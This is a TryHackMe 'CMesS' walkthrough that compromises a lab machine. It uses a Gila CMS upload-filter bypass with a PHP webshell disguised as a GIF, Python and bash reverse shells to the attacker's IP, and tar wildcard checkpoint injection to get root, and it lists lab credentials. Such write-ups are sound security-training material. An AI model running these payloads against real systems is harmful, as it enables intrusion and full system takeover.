# THM: CMesS

***Overview**: CMesS is a medium rated tryhackme machine. This machine exploits a Remote Command Execution (RCE) vulnerability in Gila CMS 1.10.9 which manipulates the media upload functionality to gain foothold into the machine and then it also exploits a wildcard cronjob running as root to escalate privilege to root. Please enjoy!!*

## Scanning and Enumeration
- we first start our reconnaissance by my running my nmap scan on the machine after adding the vhost to the /etc/hosts file

```shell
┌──(kali㉿kali)-[~]
└─$ echo "10.10.105.80 cmess.thm" | sudo tee -a /etc/hosts

```
- Then we go ahead to search for directories using FFUF
`ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://cmess.thm/FUZZ -e .php,.txt`

![](assets/CMesS_assets/Pasted%20image%2020230521150144.png)

- from our nmap scan, we can see that our robots.txt file is available to view

![](assets/CMesS_assets/Pasted%20image%2020230521100856.png)

- but going to all the directories specified in the robots.txt file, we can see that it keeps redirecting us to a forbidden directory
for all of the directories above

![](assets/CMesS_assets/Pasted%20image%2020230521101428.png)

![](assets/CMesS_assets/Pasted%20image%2020230521141829.png)

- we then scan for subdomains using ffuf, and we discover the subdomain dev
`ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.cmess.thm" -u http://cmess.thm -fw 522`

![](assets/CMesS_assets/Pasted%20image%2020230521112356.png)

- we can then add this subdomain to the /etc/hosts file and then verify its existence by curling to that subdomain

```shell
┌──(kali㉿kali)-[~]
└─$ echo "10.10.168.183 dev.cmess.thm" | sudo tee -a /etc/hosts
[sudo] password for kali:

```
- going to the subdomain, we can see a conversation between a user andre and the support, from this conversation, we areable to obtain credentials such as email and password

![](assets/CMesS_assets/Pasted%20image%2020230521112536.png)

- we attempt to login at /admin using andre@cmess.thm as email and KPFTN_f2yxe% as password and we gain access

![](assets/CMesS_assets/Pasted%20image%2020230521113013.png)

## Exploitation

- we can see the version of the Gila CMS running

![](assets/CMesS_assets/Pasted%20image%2020230521113200.png)

- so now we can search for exploits for this CMS and we found one at [https://rastating.github.io/gila-cms-upload-filter-bypass-and-rce/](https://rastating.github.io/gila-cms-upload-filter-bypass-and-rce/)
- Following the steps in the exploit, we create a file test.gif with the contents and upload it in the media 
```
GIF89a; <?=`$_GET[1]`?>
```

![](assets/CMesS_assets/Pasted%20image%2020230521115407.png)

```ad-note
I attempted uploading a php reverse shell file but the file format wasn't acceptable
```
- we can view the image in the media to know the directory our .gif file will be located and we can see below it is stored at `/tmp/media_thumb`

![](assets/CMesS_assets/Pasted%20image%2020230521115902.png)

- we then move the saved test.gif file to the file `tmp/media_thumb/shell.php`

![](assets/CMesS_assets/Pasted%20image%2020230521114718.png)

- we then create another file test2.gif with the content `# GIF89a;` and then move the file to the file  `/tmp/.htaccess`

![](assets/CMesS_assets/Pasted%20image%2020230521115152.png)

- then we try to view /etc/passwd file to test http://cmess.thm/tmp/media_thumb/shell.php?1=cat+/etc/passwd and worked, we have Remote Code Execution (RCE)!!!!

![](assets/CMesS_assets/Pasted%20image%2020230521115711.png)

- we can run the `whoami` command

![](assets/CMesS_assets/Pasted%20image%2020230521120101.png)

## Foothold
- we can also see if python3 is running so we can attempt a reverse shell, and it is

![](assets/CMesS_assets/Pasted%20image%2020230521120213.png)

- now we run the following command with our netcat listening
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.80.123",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
- and we get a shell

![](assets/CMesS_assets/Pasted%20image%2020230521121926.png)

## Further Enumeration and Privilege Escalation

- we run the `history`, `sudo -l` and other commands to see if we can find escalation vectors, then when we view our crontabs, we notice something interesting, a cronjob running with a wild card but to be able to exploit this, we have to gain foothold as andre, so we keep looking

![](assets/CMesS_assets/Pasted%20image%2020230521122712.png)

- we can view the open ports running on the machine to check for ports running locally and we can see that we have port 3306 running, which gives us a hint that  mysql is running

![](assets/CMesS_assets/Pasted%20image%2020230521131248.png)

- looking through files we can see the config.php file and we get some credentials which seem like it belongs to a mysql account running locally, the username is root, the password is r0otus3rpassw0rd, and the database name is gila

![](assets/CMesS_assets/Pasted%20image%2020230521131133.png)

- so we sign in to the mysql database and look through for maybe credentials

![](assets/CMesS_assets/Pasted%20image%2020230521131441.png)

- we find a hash for andre but after analysis, we discover it is a blowfish hash and might belongs to the password we found in the dev subdomain which we found earlier, so we move on

![](assets/CMesS_assets/Pasted%20image%2020230521141234.png)

- we run our linpeas.sh script and then we notice a hidden file .password.bak in the /opt directory

![](assets/CMesS_assets/Pasted%20image%2020230521135627.png)

- viewing it we discover andre's backup password as UQfsdCB7aAP6, JACKPOT!!

![](assets/CMesS_assets/Pasted%20image%2020230521135718.png)

- so since we know ssh is open on the system, we try logging in with the credentials found and BOOM, we get access

![](assets/CMesS_assets/Pasted%20image%2020230521135903.png)

- so now we can finally exploit the cronjob using a wildcard, now our cronjob runs after every 2 minutes
- what the cronjob command does is to change directory to the backup directory and then archive all its files in a gzip archive in the tmp directory

![](assets/CMesS_assets/Pasted%20image%2020230521135929.png)

- we can view the contents of the file in the backup directory know as note

![](assets/CMesS_assets/Pasted%20image%2020230521162642.png)

- so now that we understand what is happening,  we will run the following commands consecutively

```shell
andre@cmess:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/runme.sh
andre@cmess:~$ chmod +x runme.sh 
andre@cmess:~$ touch /home/andre/backup--checkpoint=1
andre@cmess:~$ touch /home/andre/backup--checkpoint-action=exec=sh\ runme.sh
```
- the first command just saves the command in a file runme.sh, what the command does is to copy the bash file to tmp folder and then add suid permission to that bash file, so we can just run `/tmp/bash -p` and get a shell
- then we run the rest of the commands which exploit the `tar` command
- after executing the commands, we wait a while for the cronjob to run and when we view the /tmp folder, we can see the bash file

![](assets/CMesS_assets/Pasted%20image%2020230521152449.png)

- so now we can run the `/tmp/bash -p` command and get a shell as root

![](assets/CMesS_assets/Pasted%20image%2020230521152537.png)

- we finally get our root.txt file

![](assets/CMesS_assets/Pasted%20image%2020230521153520.png)

OR
- Another way we can do this by getting a reverse shell as root on a listening port, so we can run the following commands in the backup directory, because it is being backed up using the tar command

```shell
andre@cmess:~/backup$ echo "bash -i >& /dev/tcp/10.8.80.123/4040 0>&1" > test.sh
andre@cmess:~/backup$ cat runme.sh 
bash -i >& /dev/tcp/10.8.80.123/4040 0>&1
andre@cmess:~/backup$ chmod +x test.sh
andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=bash test.sh"
andre@cmess:~/backup$ echo "" > --checkpoint=1
```
- and on our listening port we can see we have access as root

![](assets/CMesS_assets/Pasted%20image%2020230521155102.png)

- and we get our root file

![](assets/CMesS_assets/Pasted%20image%2020230521155147.png)
